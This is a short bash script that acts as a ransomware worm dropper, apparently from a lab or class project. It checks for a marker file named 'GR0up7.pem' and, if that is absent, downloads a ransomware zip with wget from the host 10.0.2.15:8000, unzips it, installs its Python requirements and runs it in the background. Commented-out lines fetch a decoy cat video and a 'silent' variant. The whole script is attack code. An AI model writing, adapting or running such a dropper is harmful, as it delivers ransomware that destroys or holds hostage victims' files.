#!/bin/bash

NO_INFECTION_FILE="/home/$USER/GR0up7.pem"

if [ -e "$NO_INFECTION_FILE" ]; then
    echo "Computer already infected"
else
    mkdir ransom-worm; cd ransom-worm; # Creates the ransomware folder

    # We don't want the video to be opened in the network propagation victims
    # /usr/bin/wget -O cutecats.mp4 '10.0.2.15:8000/send_video'; # Downloads the video
    # /usr/bin/xdg-open cutecats.mp4; # Opens the video 

    /usr/bin/wget -O ransom_worm.zip '10.0.2.15:8000/send_ransomworm'; # Downloads the worm
    /usr/bin/unzip ransom_worm.zip; # Unzips the worm
    python3 -m pip install -r requirements.txt; # Installs the requirements.txt
    rm -r ransom_worm.zip
    python3 main.py &; # Runs the ransomware

    # /usr/bin/wget -O silent_ransom_worm.sh '10.0.2.15:8000/send_ransomworm_silent';
    # chmod +x silent_ransom_worm.sh;
    # ./silent_ransom_worm.sh;
fi